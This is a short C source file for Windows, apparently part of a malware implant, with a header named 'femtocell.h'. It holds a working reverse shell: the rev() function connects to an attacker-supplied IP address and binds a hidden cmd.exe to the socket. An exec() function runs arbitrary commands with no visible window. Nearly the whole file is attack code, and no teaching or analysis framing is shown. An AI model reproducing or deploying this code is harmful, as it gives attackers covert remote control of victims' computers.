#include "femtocell.h"

void rev(char* ip)
{
	WSADATA wsaData;
	SOCKET wSock;
	struct sockaddr_in hax;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(REV_PORT);
	hax.sin_addr.s_addr = inet_addr(ip);

	if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL))
	{
#ifdef DEBUG
		printf("WSAConnnect Failed");
#endif
		return;
	}

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)wSock;

	if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
#ifdef DEBUG
		printf("CreateProcess failed (%d).\n", GetLastError());
#endif
		return;
	}
}

void exec(char* cmd)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	
	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
#ifdef DEBUG
		printf("CreateProcess failed (%d).\n", GetLastError());
#endif
		return;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}